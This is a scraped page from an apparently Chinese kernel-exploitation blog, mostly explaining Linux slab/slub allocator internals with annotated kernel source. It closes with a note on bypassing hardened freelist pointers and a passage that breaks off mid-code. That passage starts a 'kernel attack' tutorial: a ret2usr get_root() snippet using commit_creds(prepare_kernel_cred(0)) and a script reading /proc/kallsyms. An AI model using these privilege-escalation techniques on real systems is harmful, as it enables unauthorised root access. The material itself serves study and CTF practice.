class="line">	<span class="keyword">atomic_long_t</span> nr_slabs;</span><br><span class="line">	<span class="keyword">atomic_long_t</span> total_objects;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>由上代码可以看出，struct kmem_cache_node 对于本节点中 slab 的管理主要分了3个链表:<ul>
<li>部分空闲 slab 链表（slabs_partial）</li>
<li>全空闲 slab 链表（slabs_free）</li>
<li>非空闲 slab 链表（slabs_full）</li>
</ul>
</li>
<li>单个 slab 可以在不同的链表之间移动，例如当一个 slab 被分配完，就会从 slab_partial 移动到 slabs_full，当一个 slab 中有对象被释放后，就会从 slab_full 再次回到 slab_partial，所有对象都被释放完的话，就会从 slab_partial 移动到 slabs_free</li>
<li>struct kmem_cache_node 还会将本地节点中需要节点共享的 slab obj 缓存在它的 shared 成员中，若本地节点向访问其他节点贡献的 slab obj，可以利用 struct kmem_cache_node 中的 alien 成员去获取</li>
</ul>
<p><strong>slab机制</strong></p>
<p>slab 算法在伙伴算法的基础上，对小内存的场景专门做了优化，采用了内存池的方案，解决内部碎片问题</p>
<p>先挂一张图片： </p>
<img src="/2022/05/23/BuddySystem&Slab/1653927280497-1655875583493.png" class width="1653927280497"> 
<p><strong>从 buddy 分配出来的那一份份连续的 page 就是一个 slab</strong></p>
<ul>
<li>首先我们要知道是 slab 分配器是基于 buddy 分配器的，即 slab 需要从 buddy 分配器获取连续的物理页帧作为制造对象的原材料</li>
<li>简单来说，就是基于 buddy 分配器获得连续的 pages，作为某数据结构对象的缓存，再将这段连续的 pages 从内部切割成一个个对齐的对象，使用时从中取用，这样一段连续的 page 我们称为一个 slab</li>
</ul>
<p><strong>把各个 slab 分组管理，每一个组对应一个 kmem_cache，对应一种分配“规则”</strong></p>
<ul>
<li>在 slab 算法中维护着大小不同的 slab 集合，在最顶层是 cache_chain，cache_chain 中维护着一组 kmem_cache 引用</li>
<li>kmem_cache 负责管理一块固定大小的对象池，通常会提前分配一块内存，然后将这块内存划分为大小相同的 object（分配给用户的对象），不会对内存块再进行合并，同时使用位图 bitmap 记录每个 object 的使用情况</li>
<li>把各个 slab 进行分组管理，每个组分别包含 2^3，2^4，2^5 … 2^11 … 个字节（在 4K 页大小的默认情况下），另外还有两个特殊的组，分别是 96B 和 192B，每个组就是一个 kmem_cache</li>
<li>不同内核版本的分组数不同（大约20个），比如我的内核就分配了26个组：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">kmalloc_index</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!size)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line">		<span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">4</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">22</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">24</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">	<span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">	BUG();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>slab 分配器并非一开始就能智能的根据内存分档值分配相应长度的内存的，它需要先创建一个这样的“规则”式的东西，之后才可以根据这个“规则”分配相应长度的内存 </li>
<li>内核 slab 分配器之所以能够默认的提供26种内存长度分档，肯定也需要创建这样26个“规则”，这是由函数 kmem_cache_init 在初始化时创建的</li>
<li>比如现在有一个内核模块想要申请一种它自创的结构，这个结构是111字节，并且它不想获取128字节内存就想获取111字节长度内存，那么它需要在 slab 分配器中创建一个这样的“规则”，这个规则规定 slab 分配器当按这种“规则”分配时要给我111字节的内存，这个“规则”的创建方法就是调用函数 kmem_cache_create</li>
<li>函数 kmem_cache_destroy 可以销毁 kmem_cache_create 创建的“规则”，而这个“规则”就是“缓存描述符 kmem_cache”</li>
</ul>
<p><strong>slub接口</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 分配一块给某个数据结构使用的kmem_cache(缓存描述符) */</span></span><br><span class="line"><span class="function">struct kmem_cache *<span class="title">kmem_cache_create</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> align, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags， <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span>*))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 销毁kmem_cache_create分配的kmem_cache */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kmem_cache_destroy</span><span class="params">(struct kmem_cache *cachep)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从目标kmem_cache中分配一个object */</span>  </span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">kmem_cache_alloc</span><span class="params">(struct kmem_cache* cachep, <span class="keyword">gfp_t</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 释放object,把它返还给原先的kmem_cache */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmem_cache_free</span><span class="params">(struct kmem_cache* cachep,  <span class="keyword">void</span>* objp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 输入想要的size,分配一个object,其他工作交给伙伴系统和slub */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmalloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 输入目标obj,释放它,其他工作交给伙伴系统和slub */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *objp)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>先通过 kmem_cache_create 创建一个缓存管理描述符 kmem_cache</li>
<li>使用 kmem_cache_alloc 从缓存 kmem_cache 中申请 object 使用</li>
<li>函数 kmem_cache_init 在初始化时会自动创建默认的 kmem_cache </li>
</ul>
<h2 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a>kmalloc</h2><p>kmalloc 本质上是调用 __kmalloc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1\mm\slub.c */</span></span><br><span class="line"><span class="keyword">void</span> *__kmalloc(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line">		<span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line"></span><br><span class="line">	s = kmalloc_slab(size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line">	ret = slab_alloc(s, flags, _RET_IP_); <span class="comment">/* 从对应的kmem_cache中分配对象 */</span></span><br><span class="line"></span><br><span class="line">	trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, flags);</span><br><span class="line"></span><br><span class="line">	kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__kmalloc);</span><br></pre></td></tr></table></figure>
<ul>
<li>kmalloc() 先根据 size 找到对应的 <code>struct kmem_cache</code> 然后调用 <code>slab_alloc()</code> 从中分配对象</li>
</ul>
<p>slab_alloc：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* linux-4.20.1\mm\slub.c */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后在 <code>slab_alloc()</code> 中调用 <code>slab_alloc_node</code></li>
</ul>
<p>slab_alloc_node：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"></span><br><span class="line">	s = slab_pre_alloc_hook(s, gfpflags);</span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        必须通过本cpu指针去读kmem_cache中的cpu相关数据, </span></span><br><span class="line"><span class="comment">        当读一个CPU区域内的数据时有可能在cpu直接来回切换</span></span><br><span class="line"><span class="comment">        只要我们在执行cmpxchg时再次使用原始 cpu，这并不重要</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        必须保证tid和kmem_cache都是通过同一个CPU获取的</span></span><br><span class="line"><span class="comment">        如果开启了CONFIG_PREEMPT(内核抢占), 那么有可能获取tid之后被换出, 导致tid与c不对应, 所以这里需要一个检查</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">		c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">	&#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp;</span><br><span class="line">		 unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">	barrier(); <span class="comment">// 编译屏障, 防止指令乱序</span></span><br><span class="line"></span><br><span class="line">	object = c-&gt;freelist; <span class="comment">// 获取空闲链表中的对象</span></span><br><span class="line">	page = c-&gt;page; <span class="comment">// 正在被用来分配对象的页</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">        <span class="comment">/* 如果空闲链表为空或者page不属于要求的节点,那么就进入slowpath部分 */</span></span><br><span class="line">		object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">		stat(s, ALLOC_SLOWPATH);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 否则进入fastpath,通过CPU缓存中的freelist进行分配 */</span></span><br><span class="line">		<span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*这里要执行链表的取出操作, this_cpu_cmpxchg_double()作用为:</span></span><br><span class="line"><span class="comment">        如果s-&gt;cpu_slab-&gt;freelist==object, 那么s-&gt;cpu_slab-&gt;freelist=next_object</span></span><br><span class="line"><span class="comment">        如果s-&gt;cpu_slab-&gt;tid==tid, 那么s-&gt;cpu_slab-&gt;tid=next_tid(tid), next_tid(tid)</span></span><br><span class="line"><span class="comment">        如果执行到一半s-&gt;cpu_slab被其他slub拿去使用, 那么compare失败, 不执行写入, 返回redo重新试一下</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">				s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">				object, tid,</span><br><span class="line">				next_object, next_tid(tid)))) &#123; <span class="comment">// next_tid(tid)相当于tid+1</span></span><br><span class="line"></span><br><span class="line">			note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line">			<span class="keyword">goto</span> redo;</span><br><span class="line">		&#125;</span><br><span class="line">		prefetch_freepointer(s, next_object); <span class="comment">// 把预读进缓存</span></span><br><span class="line">		stat(s, ALLOC_FASTPATH); <span class="comment">// 记录状态</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(gfpflags &amp; __GFP_ZERO) &amp;&amp; object) <span class="comment">// 如果flag要求清0</span></span><br><span class="line">		<span class="built_in">memset</span>(object, <span class="number">0</span>, s-&gt;object_size);</span><br><span class="line"></span><br><span class="line">	slab_post_alloc_hook(s, gfpflags, <span class="number">1</span>, &amp;object); <span class="comment">// 空操作</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里我们主要考虑 fastpath，也就是使用 freelist 的这种情况</li>
</ul>
<p>get_freepointer_safe：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">get_freepointer_safe</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freepointer_addr;</span><br><span class="line">	<span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!debug_pagealloc_enabled()) <span class="comment">/* 如果没开启CONFIG_DEBUG_PAGEALLOC,那么就会进入get_freepointer() */</span></span><br><span class="line">		<span class="keyword">return</span> get_freepointer(s, object);</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/* 否则就会进行加密 */</span></span><br><span class="line">	freepointer_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line">	probe_kernel_read(&amp;p, (<span class="keyword">void</span> **)freepointer_addr, <span class="keyword">sizeof</span>(p));</span><br><span class="line">	<span class="keyword">return</span> freelist_ptr(s, p, freepointer_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这就是 Harden_freelist 保护（使用 <code>s-&gt;random</code> 与 <code>指针所在地址</code>  去加密原空闲指针）</li>
<li>加固指针 = 空闲指针 ^ 空闲指针地址 ^ 随机数R，只要知道这些值就可以绕过 Harden_freelist </li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/21/kernel%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/21/kernel%20attack/" class="post-title-link" itemprop="url">kernel attack（持续更新）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-21 01:37:34" itemprop="dateCreated datePublished" datetime="2022-05-21T01:37:34+08:00">2022-05-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-30 21:11:32" itemprop="dateModified" datetime="2022-06-30T21:11:32+08:00">2022-06-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><p>核心：利用 commit_creds(prepare_kernel_cred(0)) 进行提取</p>
<p>原理：该方式会自动生成一个合法的 cred，并定位当前线程的 task_struct 的位置，然后修改它的 cred 为新的 cred</p>
<p>当已知 commit_creds 和 prepare_kernel_cred 的函数地址时，用如下代码进行提权：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：“prepare_kernel_cred”和“commit_creds”都是地址，需要用函数指针执行</li>
</ul>
<p>对于这两个函数的地址，可以在 “/proc/kallsyms-内核符号表” 中找到，提供以下脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span> <span class="comment">/* 收集必要信息 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> 